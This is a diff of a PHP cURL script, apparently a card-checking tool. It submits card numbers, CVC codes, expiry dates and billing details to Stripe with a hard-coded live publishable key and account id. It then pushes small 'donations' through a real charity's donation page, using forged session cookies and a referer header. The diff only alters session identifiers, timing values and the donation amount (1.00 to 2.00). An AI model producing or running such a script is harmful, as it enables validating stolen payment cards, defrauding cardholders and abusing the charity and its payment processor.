@@ -256,7 +256,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&billing_details[email]='.$email.'&billing_details[address][line1]='.$street.'&billing_details[address][line2]=&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=bf4c1bc5-5665-4671-9c99-1284dfee1a38273ec8&sid=8c16d3ee-2705-4542-a3af-12edf6545d47d1a5ee&pasted_fields=number&payment_user_agent=stripe.js%2Fb9e9d8300%3B+stripe-js-v3%2Fb9e9d8300&time_on_page=82698&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_1031hI2bmikBJrxj');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&billing_details[email]='.$email.'&billing_details[address][line1]='.$street.'&billing_details[address][line2]=&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=bf4c1bc5-5665-4671-9c99-1284dfee1a38273ec8&sid=cacc4daa-7b5f-47ab-b61b-49c5ca32bec8e57eee&pasted_fields=number&payment_user_agent=stripe.js%2Fb9e9d8300%3B+stripe-js-v3%2Fb9e9d8300&time_on_page=86555&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_1031hI2bmikBJrxj');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -287,7 +287,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
 'cookie: wp-give_session_5f36e31b0deaee977036bf5193ad2bed=e141e1703f04b9e16a6a250e79afae5e%7C%7C1647197454%7C%7C1647193854%7C%7C77eb84d1ff243a37f2492df27d788d95; wp-give_session_reset_nonce_5f36e31b0deaee977036bf5193ad2bed=1; __stripe_mid=bf4c1bc5-5665-4671-9c99-1284dfee1a38273ec8',
 'origin: https://www.viveperu.org',
-'referer: https://www.viveperu.org/donate-now/?form-id=204834&level-id=custom&custom-amount=1.00&payment-mode=stripe_checkout&form_id=204834',
+'referer: https://www.viveperu.org/donate-now/?form-id=204834&level-id=custom&custom-amount=2.00&payment-mode=stripe_checkout&form_id=204834',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
